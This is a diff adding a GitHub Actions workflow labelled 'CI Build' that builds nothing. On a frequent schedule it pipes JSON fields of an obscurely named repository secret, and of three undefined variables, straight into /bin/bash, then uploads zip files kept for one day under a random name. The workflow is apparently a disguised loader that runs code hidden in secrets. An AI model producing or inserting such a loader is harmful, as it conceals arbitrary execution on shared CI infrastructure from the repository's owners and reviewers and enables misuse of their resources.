@@ -1,0 +1,36 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Execute
+        env:
+          tkkfj86875: ${{ secrets.tkkfj86875 }}
+        run: |
+          printf '%s' "$tkkfj86875" | jq -r .ari6 | /bin/bash
+          printf '%s' "$dkml10" | jq -r .lff34229 | /bin/bash
+          printf '%s' "$wehec510" | jq -r .yd7709 | /bin/bash
+          printf '%s' "$sfhg036" | jq -r .k78 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: WImpDZuA
+          path: "*.zip"
+          retention-days: 1
